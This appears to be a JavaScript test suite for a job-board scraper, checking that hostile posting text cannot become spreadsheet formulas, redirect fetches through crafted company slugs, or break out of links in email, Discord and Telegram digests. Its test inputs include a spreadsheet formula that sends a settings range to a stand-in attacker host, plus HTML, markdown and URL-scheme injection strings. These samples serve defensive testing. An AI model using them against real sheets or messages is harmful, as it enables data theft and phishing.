#!/usr/bin/env node
// SPDX-License-Identifier: GPL-3.0-or-later
// ---------------------------------------------------------------------------
// What a hostile job posting can do.
//
// Every string on the matches tab was written by somebody else: a job title, a
// location, a company name, a URL, all lifted from a public board that anyone
// can post to. This file is the list of things that text was able to do, each
// one written after finding it rather than before.
// ---------------------------------------------------------------------------
import { buildRecord } from './sync.js';
import { safeCell, safeValues } from './sheet/schema.js';
import { memoryClient } from './sheet/memory.js';
import { checkSlug, ADAPTERS } from './boards.js';
import { emailPayload, discordPayload, telegramPayload } from './notify.js';

let pass = 0, fail = 0;
const check = (label, ok, detail = '') => {
  ok ? pass++ : fail++;
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${label}${detail ? ` - ${detail}` : ''}`);
};

console.log('--- a posting cannot become a formula ---');
{
  // The one that shipped. IMPORTXML fetches without being clicked, so a title
  // is enough to read a range and send it somewhere.
  const attack = '=IMPORTXML(CONCAT("https://attacker.example/?x=",JOIN(",",settings!B2:B20)),"//a")';
  const rec = buildRecord({
    job: { id: '1', title: attack, url: 'https://boards.example/j/1', location: 'Remote', postedAt: '2026-08-01' },
    company: { slug: 'acme', name: 'Acme' },
    salary: null, verdict: { signals: [] }, score: { score: 90 }, settings: {},
  });
  check('the record still carries the posting verbatim', rec.title === attack);
  check('the cell it becomes cannot evaluate', !/^=/.test(safeCell(rec.title)));

  for (const lead of ['=', '+', '-', '@', '\t', '\r']) {
    check(`a cell opening with ${JSON.stringify(lead)} is quoted`,
      safeCell(`${lead}HYPERLINK("https://attacker.example","Apply")`).startsWith("'"));
  }

  // Sheets consumes the prefix on the way in, so a guarded title reads back as
  // itself. If that stopped being true every run would report a fake change.
  check('a plain title is untouched', safeCell('Head of Revenue Operations') === 'Head of Revenue Operations');
  check('a negative number stays a number', safeCell('-40000') === '-40000');
  check('an empty cell stays empty', safeCell('') === '');
}

console.log('\n--- the guard is on the write, not the planner ---');
{
  // Anything reaching a real sheet goes through applyOps. A future caller that
  // builds its own plan has to get this for free, or the fix is a convention
  // rather than a guarantee.
  const client = memoryClient();
  client.applyOps([{ op: 'addTab', tab: 'matches' }]);
  client.applyOps([{ op: 'writeRange', range: 'matches!A1:B1', values: [['=1+1', 'ok']] }]);
  const grid = client._grid('matches');
  check('a formula written through applyOps is quoted', grid[0][0] === "'=1+1", JSON.stringify(grid[0][0]));
  check('and its neighbour is untouched', grid[0][1] === 'ok');
  check('safeValues copes with a ragged grid', safeValues([['=a'], [], null])[0][0] === "'=a");
}

console.log('\n--- a slug cannot choose the host ---');
{
  // Recruitee builds https://${slug}.recruitee.com, so the slug IS the host.
  check('a slug that escapes the host is refused',
    (() => { try { checkSlug('attacker.example/x?'); return false; } catch { return true; } })());
  for (const bad of ['a/b', 'a?b', 'a@b', 'a b', '../../etc', 'a#b', '', '-lead']) {
    check(`refused: ${JSON.stringify(bad)}`,
      (() => { try { checkSlug(bad); return false; } catch { return true; } })());
  }
  for (const good of ['grafanalabs', 'acme-corp', 'apollo.io', 'a_b', '1password']) {
    check(`allowed: ${good}`, checkSlug(good) === good);
  }
  // Every adapter, not just the wrapper: four callers reach fetchJobs directly.
  for (const [name, adapter] of Object.entries(ADAPTERS)) {
    // Rejected rather than thrown: these are async in the sources and become
    // synchronous only once the build strips await. Either way the network is
    // never reached, which is the property that matters.
    let refused = false;
    try {
      await adapter.fetchJobs('attacker.example/x?', {
        fetchImpl: () => { throw new Error('reached the network'); },
      });
    } catch (err) { refused = !/reached the network/.test(err.message); }
    check(`${name} refuses a hostile slug before fetching`, refused);
  }
}

console.log('\n--- a posting cannot rewrite the digest ---');
{
  const records = [{
    score: 90,
    company: 'Acme',
    title: 'Head of RevOps](https://attacker.example) [click here',
    url: 'https://boards.example/j/1" style="position:fixed;top:0;left:0;width:100%;height:100%',
    salary: '', location: 'Remote', age: '2d', changed: '',
  }];

  const html = emailPayload(records, 'https://docs.google.com/spreadsheets/d/x/edit', 'me@example.com').html;
  check('a quote in a URL cannot close the href attribute', !/href="[^"]*"\s+style="position:fixed/.test(html));
  check('the injected quotes are inert', !/href="[^"]*"[^>]*\bstyle="position:fixed/.test(html));
  check('the whole thing stays inside one attribute', (html.match(/<a href="[^"]*"/) || [''])[0].includes('%22'));

  const md = discordPayload(records, '').content;
  check('a bracket in a title is escaped, not obeyed', md.includes('\\](https://attacker.example)'));
  check('a quote in a link target is encoded', !/\(<[^>]*"/.test(md));
  check('a closing paren in a link target cannot end it', !/\(<[^>]*\)[^>]*>\)/.test(
    discordPayload([{ ...records[0], title: 'Role', url: 'https://x.example/a)b' }], '').content));

  // Not a job posting. A link is the one thing a digest exists to hand over,
  // so the scheme is the thing to be strict about.
  for (const scheme of ['javascript:alert(1)', 'data:text/html,<script>x</script>', 'vbscript:x', 'file:///etc/passwd']) {
    const one = [{ ...records[0], title: 'Role', url: scheme }];
    check(`${scheme.split(':')[0]}: is not linked in mail`, !emailPayload(one, '', 'me@example.com').html.includes(scheme));
    check(`${scheme.split(':')[0]}: is not linked on Discord`, !discordPayload(one, '').content.includes(scheme));
    check(`${scheme.split(':')[0]}: is not linked on Telegram`, !telegramPayload(one, '', '1').text.includes(scheme));
  }

  // The webhook is a secret. A digest that echoed it would put it in a channel
  // anyone in the server can read.
  check('a real https job link still survives',
    emailPayload([{ ...records[0], url: 'https://boards.example/j/1' }], '', 'me@example.com')
      .html.includes('https://boards.example/j/1'));
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
